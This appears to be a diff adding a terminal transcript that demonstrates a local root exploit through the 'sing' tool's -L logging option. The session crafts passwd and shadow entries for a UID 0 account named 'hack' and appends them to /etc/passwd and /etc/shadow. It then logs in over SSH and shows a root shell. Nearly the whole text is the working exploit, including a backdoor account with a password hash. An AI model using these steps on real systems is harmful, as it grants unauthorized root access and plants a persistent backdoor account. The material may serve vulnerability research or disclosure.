@@ -1,0 +1,33 @@
+gat3way@gat3way:~$ cat hah
+
+hack:x:0:0:/tmp:/bin/sh
+
+n
+gat3way@gat3way:~$ cat hah1
+
+hack:$1$of1h/mN2$p5i.rW0mnhryrG3.zAMIh/:13705:0:99999:7:::
+
+n
+gat3way@gat3way:~$ grep hack /etc/passwd
+gat3way@gat3way:~$ sing -L /etc/shadow localhost -p "`cat hah1`"
+SINGing to localhost (127.0.0.1): 78 data bytes
+78 bytes from 127.0.0.1: seq=0 ttl=64 TOS=0 time=0.073 ms
+
+--- localhost sing statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.073/0.073/0.073 ms
+gat3way@gat3way:~$ sing -L /etc/passwd localhost -p "`cat hah`"
+SINGing to localhost (127.0.0.1): 43 data bytes
+43 bytes from 127.0.0.1: seq=0 ttl=64 TOS=0 time=0.083 ms
+
+--- localhost sing statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.083/0.083/0.083 ms
+gat3way@gat3way:~$ grep hack /etc/passwd
+hack:x:0:0:/tmp:/bin/sh
+gat3way@gat3way:~$ ssh hack@localhost
+hack@localhost's password:
+..
+root@gat3way:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@gat3way:~#
